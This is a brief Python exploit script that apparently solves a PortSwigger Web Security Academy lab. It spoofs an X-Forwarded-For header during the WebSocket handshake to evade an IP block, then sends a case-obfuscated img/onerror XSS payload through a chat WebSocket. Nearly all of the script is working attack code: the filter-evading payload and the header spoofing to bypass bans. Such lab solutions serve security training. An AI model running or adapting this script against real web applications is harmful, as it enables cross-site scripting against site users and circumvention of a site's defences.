from urllib.parse import unquote
import websockets
import sys
import requests
import asyncio

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
chat_url = burp_url + '/chat'
websocket_url = 'wss://' + burp_url[8:] + '/chat'

session = requests.Session()
session.get(burp_url)

burp_headers = {"X-Forwarded-For": "1.1.1.1","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0", "Accept": "*/*", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Sec-Websocket-Version": "13", "Origin": "https://0a2e001603fc677180105dea00ed0092.web-security-academy.net", "Sec-Websocket-Key": "MBZq+9CTMBMhL81FmqgOTw==", "Connection": "keep-alive, Upgrade", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "websocket", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade": "websocket"}
session.get(chat_url, headers=burp_headers)

xss_payload = '{"message":"<img src=1 oNeRrOr=alert`1`>"}'
#x = quote(xss_payload)
#print(x)
async def send_xss_payload():
    async with websockets.connect(websocket_url) as websocket:
        await websocket.send(unquote(xss_payload))
        print(f"Sent payload: {xss_payload}")

asyncio.run(send_xss_payload())
